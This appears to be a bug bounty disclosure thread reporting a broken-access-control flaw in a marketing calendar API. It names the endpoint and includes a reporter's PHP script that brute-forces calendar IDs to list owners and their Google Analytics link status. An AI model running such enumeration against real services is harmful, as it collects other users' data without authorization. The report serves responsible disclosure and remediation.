title: IDOR in marketing calendar tool
vulnerability_information:
#INTRODUCTION

##_I used two accounts to search for this vulnerability:_
**Id:** â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ **Email:** â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
**Id:** â–ˆâ–ˆâ–ˆ **Email:** â–ˆâ–ˆâ–ˆ

##_IP used:_
**78.194.169.36**

##_Endpoint URL:_
https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=CALENDAR_ID

#EXPLOITATION

##_Description of Security Issue:_
When a marketing calendar is loaded in the browser, the site sends a request such as this: {F718449}.
This request returns information such as if the owner has connected a google analytic account and the owner's user id associated with the calendar with the id pass in parameter. The problem comes from the fact that it is not verified that the user making the request has the calendar or that the person is invited to consult it.

#RESOLUTION
Check that the user making the request has the calendar or that the person is invited to consult the calendar.

## Impact

##_Exploit scenario for this vulnerability:_

 - A user such as a concurrent service could by bruteforcing the "calendar_id" parameter establish a list of all calendars and the number of unique users who have created calendars. It will also know the number of users who have connected their google analytic account on it. This represents bussiness data.

 - A user who knows someone's user_id (because he was invited to a calendar owned by the victim for example) can by bruteforcing the parameter "calendar_id" establish the number of calendar owned by the victim and the number of calendar being linked to a google analytic account.

Endpoint URL:

https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=CALENDAR_ID

EXPLOITATION

Description of Security Issue:

When a marketing calendar is loaded in the browser, the site sends a request such as this: .
This request returns information such as if the owner has connected a google analytic account and the owner's user id associated with the calendar with the id pass in parameter. The problem comes from the fact that it is not verified that the user making the request has the calendar or that the person is invited to consult it.

RESOLUTION

Check that the user making the request has the calendar or that the person is invited to consult the calendar.

Impact

Exploit scenario for this vulnerability:

  • A user such as a concurrent service could by bruteforcing the "calendar_id" parameter establish a list of all calendars and the number of unique users who have created calendars. It will also know the number of users who have connected their google analytic account on it. This represents bussiness data.

  • A user who knows someone's user_id (because he was invited to a calendar owned by the victim for example) can by bruteforcing the parameter "calendar_id" establish the number of calendar owned by the victim and the number of calendar being linked to a google analytic account.

activities.markdown_message:
Hello,
Could you please get more details on impact
At the moment I canâ€™t find this report as valid.

Hello,
I created a script in php which could illustrate the first attack scenario that can come from a concurrent service.
(I know that php is not the most suitable language for this kind of task but that should illustrate my point).
This script will bruteforced the calendar_id parameter and will create an array showing the result.
Each key in the array created corresponds to a user_id.
The content associated with the key is an array containing all the calendars found and whether a google analytic account has been associated.
To prevent unauthorized people from seeing this information, you must verify that the user making the request is the owner of the calendar or that he was invited to access it.

<?php

$array_result = [];

for ($I = 30000 ; $I > 10000 ; $I--)
{
    $curl = curl_init();
    $opts = [
        CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id='.$I,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0',
        CURLOPT_HTTPHEADER => ['Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false
    ];
    curl_setopt_array($curl, $opts);
    $reponse = json_decode(curl_exec($curl),true);

    if (array_key_exists($reponse['id'],$array_result))
    {
        //User has multiple calendars
        if ($reponse['status'] == "AUTHORISED")
        {
            //a google analytic account was linked to this calendar
            array_push( $array_result[$reponse['id']] , ['AUTHORISED',$I]);
        }
        else
        {
            //no google analytic account linked to this calendar
            array_push( $array_result[$reponse['id']] , ['NON_AUTHORISED',$I]);
        }
    }
    else
    {
        //1st calendar found belonging to this user
        if ($reponse['status'] == "AUTHORISED")
        {
            //a google analytic account was linked to this calendar
            $array_result[$reponse['id']] = ['AUTHORISED',$I];
        }
        else
        {
            //no google analytic account linked to this calendar
            $array_result[$reponse['id']] = ['NON_AUTHORISED',$I];
        }
    }
}

var_dump($array_result);

?>

By trying this script with a calendar_id belonging to me I got this:

activities.message: If a person happens to have access to the user_id of another person (for example when a person is invited to see a calendar the guest has access to the user_id of the participants) then he has the possibility of using this data to find the user_id corresponding to the victim and thus know the number of calendars created by it, and among each calendar which are linked to a google analytic account.
activities.markdown_message: If a person happens to have access to the user_id of another person (for example when a person is invited to see a calendar the guest has access to the user_id of the participants) then he has the possibility of using this data to find the user_id corresponding to the victim and thus know the number of calendars created by it, and among each calendar which are linked to a google analytic account.

activities.message:
You gave me a first promo code that I used for a semrush account and then I asked you if I could have a second for my second account to test for vulnerabilities like this. You gave me two but I only used one as I already have an account with the first promo code. The promo code is non-cumulative and my account with the first promo code has expired and I can no longer use the one in reserve because it too has to expire.
Would you agree to give me a new one please?
